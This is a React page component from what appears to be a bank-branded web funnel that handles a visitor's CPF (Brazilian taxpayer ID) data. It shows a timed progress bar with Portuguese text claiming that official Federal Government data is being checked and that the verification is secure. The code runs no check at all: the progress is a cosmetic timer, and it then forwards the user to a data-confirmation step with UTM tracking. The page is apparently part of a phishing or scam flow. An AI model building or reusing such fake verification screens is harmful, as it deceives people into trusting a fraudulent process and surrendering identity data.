import { useEffect, useState } from "react";
import { useNavigate, useLocation } from "react-router-dom";
import { Shield } from "lucide-react";
import WillBankHeader from "@/components/WillBankHeader";
import WillBankCard from "@/components/WillBankCard";
import WillBankFooter from "@/components/WillBankFooter";
import { CPFData } from "@/lib/cpf";
import { saveSession, getSession } from "@/hooks/useSessionPersistence";
import { buildUrlWithUtm } from "@/hooks/useUtmTracking";

const Verificando = () => {
  const navigate = useNavigate();
  const location = useLocation();
  const [progress, setProgress] = useState(0);

  // Try to get cpfData from location state or session
  const cpfData: CPFData | undefined = location.state?.cpfData || getSession()?.cpfData;

  useEffect(() => {
    if (!cpfData) {
      navigate("/");
      return;
    }

    // Save session
    saveSession({ cpfData, currentStep: "/verificando" });

    // Animação de progresso
    const interval = setInterval(() => {
      setProgress(prev => {
        if (prev >= 100) {
          clearInterval(interval);
          setTimeout(() => {
            navigate(buildUrlWithUtm("/confirma-dados"), { state: { cpfData } });
          }, 500);
          return 100;
        }
        return prev + 2;
      });
    }, 60);

    return () => clearInterval(interval);
  }, [cpfData, navigate]);

  if (!cpfData) return null;

  return (
    <div className="min-h-screen min-h-[100dvh] bg-background flex flex-col">
      <WillBankHeader />

      <main className="flex-1 flex items-center justify-center p-3 sm:p-6">
        <WillBankCard className="w-full max-w-md">
          <div className="space-y-8 text-center py-4">
            {/* Animated Shield Icon */}
            <div className="relative w-24 h-24 sm:w-28 sm:h-28 mx-auto">
              {/* Outer animated ring */}
              <div className="absolute inset-0 rounded-full border-4 border-primary/20 animate-pulse-ring" />
              {/* Middle ring */}
              <div className="absolute inset-2 rounded-full border-3 border-primary/40" />
              {/* Inner ring */}
              <div className="absolute inset-4 rounded-full border-2 border-primary" />
              {/* Shield icon */}
              <div className="absolute inset-0 flex items-center justify-center">
                <div className="w-12 h-12 sm:w-14 sm:h-14 bg-gradient-to-br from-primary to-amber-400 rounded-full flex items-center justify-center shadow-lg animate-float">
                  <Shield className="w-6 h-6 sm:w-7 sm:h-7 text-primary-foreground" />
                </div>
              </div>
            </div>

            <div className="space-y-1.5">
              <h1 className="text-xl sm:text-2xl font-bold text-foreground tracking-tight">
                Verificando informações
              </h1>
              <p className="text-muted-foreground text-sm">
                Consultando dados oficiais do Governo Federal
              </p>
            </div>

            {/* Progress */}
            <div className="space-y-3 px-1">
              <div className="flex items-center justify-between text-sm">
                <span className="text-muted-foreground font-medium text-xs">Progresso da verificação</span>
                <span className="font-bold text-foreground text-base">{progress}%</span>
              </div>
              <div className="h-2.5 bg-muted rounded-full overflow-hidden shadow-inner">
                <div 
                  className="h-full bg-gradient-to-r from-primary to-amber-400 transition-all duration-150 rounded-full"
                  style={{ width: `${progress}%` }}
                />
              </div>
              <p className="text-xs text-muted-foreground">
                Aguarde enquanto verificamos seus dados...
              </p>
            </div>

            {/* Security Badge */}
            <div className="inline-flex items-center gap-2 bg-primary/10 text-primary px-4 py-2 rounded-full text-xs sm:text-sm font-semibold shadow-sm">
              <span>🛡️</span>
              <span>Verificação Segura</span>
            </div>
          </div>
        </WillBankCard>
      </main>

      <WillBankFooter />
    </div>
  );
};

export default Verificando;
